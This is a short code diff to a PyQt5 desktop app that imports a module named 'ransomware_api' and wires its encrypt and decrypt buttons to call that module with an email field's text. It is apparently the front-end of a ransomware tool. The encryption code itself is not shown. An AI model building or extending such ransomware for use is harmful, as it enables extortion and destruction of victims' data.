@@ -9,6 +9,8 @@ import re
 from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QLineEdit, QProgressBar
 from PyQt5.QtGui import QIcon
 from PyQt5.QtCore import pyqtSlot
+
+import ransomware_api as rs_api
  
 class App(QWidget):
  
@@ -69,12 +71,16 @@ class App(QWidget):
 	def encrypt(self):
 		#encryption script called here and final button made true at the end
 		#this will also update the loading bar
+
+		rs_api.encrypt(self.emailLine.text())
 		
+		#enable decryption after encryption is complete
 		self.decryptButton.setEnabled(True)
 
 	def decrypt(self):
 		#decryption script called here- will also update the loading bar
-		
+		rs_api.decrypt(self.emailLine.text())
+
 		print("decrypt")
 
 	def setButton(self, title, method, size, position):
